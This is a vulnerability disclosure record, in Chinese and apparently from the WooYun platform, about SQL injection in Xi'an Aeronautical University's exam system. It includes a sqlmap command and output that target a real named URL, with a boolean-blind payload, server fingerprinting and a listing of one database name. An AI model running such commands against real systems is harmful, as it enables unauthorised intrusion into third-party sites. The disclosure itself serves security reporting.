wybug_title: 西安航空考试系统SQL注入
wybug_status: 已交由第三方合作机构(CCERT教育网应急响应组)处理
wybug_detail:
漏洞详情 披露状态：   									2015-06-25：	细节已通知厂商并且等待厂商处理中									2015-06-30：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： RT 详细说明：  
sqlmap>sqlmap.py -u http://kszx.xaau.edu.cn/news.php?id=13 AND 5861=5861 --ds    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutua consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not resposible for any misuse or damage caused by this program[*] starting at 14:08:58[14:08:58] [INFO] resuming back-end DBMS 'mysql'[14:08:58] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requsts:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=13 AND 5861=5861---[14:08:59] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.5back-end DBMS: MySQL 5

available databases [1]:[*] hzdb

wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-06-30 14:48 厂商回复：  最新状态： 暂无
